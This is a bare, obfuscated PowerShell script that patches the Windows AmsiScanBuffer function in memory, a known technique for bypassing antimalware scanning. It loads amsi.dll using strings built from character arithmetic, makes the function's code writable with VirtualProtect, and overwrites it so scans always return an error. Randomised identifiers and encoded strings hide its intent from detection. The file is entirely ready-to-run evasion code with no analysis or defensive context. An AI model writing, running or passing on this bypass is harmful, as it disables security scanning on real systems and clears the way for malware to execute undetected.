$OzgKR3eLpXrVm5Z = @"
using System;
using System.Runtime.InteropServices;
public class OzgKR3eLpXrVm5Z {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr k7VRG6j9ltYRSRk1f, string JJGMZ6I4wTxNmN);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr J7fnzGueMHj, UIntPtr LRL5A9mRPbkwgz5X, uint hCdocAVtD4zeAsygn, out uint tmIgCU2);
}
"@

Add-Type $OzgKR3eLpXrVm5Z

$duPwSWE90t = [OzgKR3eLpXrVm5Z]::LoadLibrary("$([CHAR](97*45/45)+[chaR](109*37/37)+[ChAr](115*39/39)+[CHaR]([bYtE]0x69)+[cHaR]([byTE]0x2e)+[ChAR](100+45-45)+[cHaR]([bYTe]0x6c)+[ChaR]([byTE]0x6c))")
$X6cpR9WcHTo = [OzgKR3eLpXrVm5Z]::GetProcAddress($duPwSWE90t, "$(('ÁmsíScânB'+'ûffér').NOrmALiZE([ChAR](70*24/24)+[cHaR]([bYtE]0x6f)+[chAr](114+36-36)+[CHaR](109+41-41)+[Char](68)) -replace [CHAr](92)+[Char](112+15-15)+[char](123*24/24)+[ChaR](77+8-8)+[ChAr]([BYTE]0x6e)+[CHar](125*43/43))")
$p = 0
[OzgKR3eLpXrVm5Z]::VirtualProtect($X6cpR9WcHTo, [uint32]5, 0x40, [ref]$p)
$ohC_PQY4RQ = "0xB8"
$JgD_O = "0x57"
$SaO = "0x00"
$x2VYQfxEV4lG = "0x07"
$HoSe9p = "0x80"
$Lf_e4lCw8N = "0xC3"
$r4CydP = [Byte[]] ($ohC_PQY4RQ,$JgD_O,$SaO,$x2VYQfxEV4lG,+$HoSe9p,+$Lf_e4lCw8N)
[System.Runtime.InteropServices.Marshal]::Copy($r4CydP, 0, $X6cpR9WcHTo, 6)